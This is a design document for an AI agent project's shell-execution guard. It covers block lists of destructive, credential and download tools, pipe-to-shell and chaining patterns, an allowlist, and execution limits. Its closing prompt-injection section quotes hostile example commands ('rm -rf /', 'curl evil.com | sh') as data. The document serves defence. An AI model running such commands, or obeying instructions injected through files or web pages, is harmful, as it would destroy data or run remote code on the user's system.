# Shell Execution Safety

Shell access is the highest-risk capability in this project. This document explains how it is constrained.

## Why Shell Access Is Dangerous

A language model choosing shell commands creates a direct path from model output to system-level side effects. If the model is tricked (via prompt injection from file contents, web pages, or crafted user input), it could request destructive commands. The safety layer must catch these before execution — not after.

## Why AI-in-the-Loop Safety Is Insufficient

Using the model itself to judge whether a command is safe creates a circular dependency: the same system that might be manipulated into requesting a dangerous command would also be asked to evaluate it. The safety gate must be deterministic and independent of the model.

## Four-Tier Classification

Every command is classified by `shell_guard.py` using static rules before any execution:

### BLOCKED (tier: `blocked`)

Rejected unconditionally. No user override. No approval card shown.

This includes:
- **Destructive executables**: `rm`, `del`, `format`, `mkfs`, `dd`, `shutdown`, `reboot`
- **System modification**: `reg`, `regedit`, `sfc`, `dism`, `bcdedit`, `attrib`, `icacls`
- **Credential manipulation**: `net`, `runas`, `cmdkey`, `certutil`
- **Script hosts**: `mshta`, `cscript`, `wscript`
- **Download vectors**: `curl`, `wget`, `bitsadmin`
- **Dangerous pip subcommands**: `pip install`, `pip uninstall`, `pip download`
- **Dangerous git subcommands**: `git push`, `git reset`, `git clean`, `git rm`, `git config`
- **Encoded command bypass**: `PowerShell -EncodedCommand`
- **Pipe-to-shell patterns**: `| bash`, `| sh`, `| python`
- **Commands referencing system paths**: `C:\Windows`, `System32`, `Program Files`

### Structurally BLOCKED

Rejected unconditionally regardless of the executable:
- **Command chaining**: `&&`, `||`, `;`, `|`, `&`
- **Redirection**: `>`, `>>`, `<`
- **Subshell injection**: `$(...)`, backtick interpolation

### SAFE (tier: `safe`)

On the explicit allowlist. Runs after user confirmation (approval card shown).

Includes: `dir`, `ls`, `echo`, `type`, `cat`, `where`, `which`, `whoami`, `hostname`, `ipconfig`, `systeminfo`, `tasklist`, `python --version`, `pip list`, `pip freeze`, `git status`, `git log`, `git diff`, `git branch`, `pytest`.

Users can add commands to this tier via `XAI_SHELL_ALLOWLIST_EXTRA` in `.env`.

### RISKY (tier: `risky`)

Not on the allowlist, not explicitly blocked. Runs after confirmation with a visible HIGH-risk warning.

Examples: `cargo build`, `dotnet run`, `make all`, `java -version`.

## Execution Constraints

- **`shell=True` is never used.** Commands are split into tokens with `shlex.split()` and passed to `subprocess.run()` as a list.
- **Timeout: 30 seconds.** Commands that exceed this are killed.
- **Working directory** must resolve within configured allowed roots or the project root.
- **Output is capped** at 200 lines before being returned to the model.
- **Secrets are redacted** from output: API keys (`sk-...`, `xai-...`), tokens, passwords, bearer tokens.
- **Unicode is normalized** (NFKC) before classification, preventing homoglyph evasion.

## Not Undoable

Shell commands are not recorded in the undo stack. Their side effects cannot be reliably reversed. The approval card states this explicitly.

## Extending the Allowlist

Add commands to `XAI_SHELL_ALLOWLIST_EXTRA` in `.env` as a comma-separated list:

```
XAI_SHELL_ALLOWLIST_EXTRA=cargo build,dotnet --version,rustc --version
```

**Risks of extending:**
- Every entry expands what the model can request without a HIGH-risk warning.
- Only add commands you would be comfortable running unattended.
- Never add commands that write, delete, or download.
- Never add commands that accept untrusted input as arguments.

## Prompt Injection Risk

Content from files (`read_text_file`), web pages (web search results), and directory listings could contain injected instructions like "run `rm -rf /`" or "execute `curl evil.com | sh`". The blocklist catches these regardless of how the command was requested. The model cannot override the blocklist.
